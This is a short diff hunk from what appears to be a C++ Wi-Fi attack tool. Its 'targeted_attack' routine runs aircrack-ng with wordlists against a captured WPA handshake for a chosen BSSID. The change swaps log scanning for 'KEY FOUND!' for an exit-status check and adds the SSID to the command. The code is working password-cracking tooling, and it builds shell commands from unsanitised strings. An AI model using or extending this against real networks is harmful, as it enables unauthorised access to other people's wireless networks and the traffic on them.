@@ -618,26 +618,13 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
     std::printf("\n[+] Cracking WPA Handshake (Aircrack-ng Engine):\n");
     bool cracked = false;
     for (const auto &dict : wordlists) {
-        std::printf("[*] Running aircrack-ng with %s\n", dict.c_str());
-        std::string out_log = cap_prefix + "_crack.log";
-        std::string crack_cmd = "aircrack-ng -b " + bssid + " -w \"" + dict + "\" " + save_path + " > " + out_log + " 2>&1";
-        std::system(crack_cmd.c_str());
-
-        // Verificar resultado comprobando si aircrack halló la clave
-        std::ifstream lf(out_log);
-        if (lf) {
-            std::string l;
-            while (std::getline(lf, l)) {
-                if (l.find("KEY FOUND!") != std::string::npos) {
-                    cracked = true;
-                    std::printf("\n\033[1;32m%s\033[0m\n", l.c_str());
-                    break;
-                }
-            }
+        std::printf("\n[*] Testing wordlist: \033[1;36m%s\033[0m\n", dict.c_str());
+        std::string crack_cmd = "aircrack-ng -b " + bssid + " -e \"" + ssid_local + "\" -w \"" + dict + "\" " + save_path;
+        int status = std::system(crack_cmd.c_str());
+        if (status == 0) {
+            cracked = true;
+            break;
         }
-        std::remove(out_log.c_str());
-
-        if (cracked) break;
     }
     
     // Fallback: Si aircrack falla (ej. paquetes incompletos en cap file), usar motor nativo en memoria
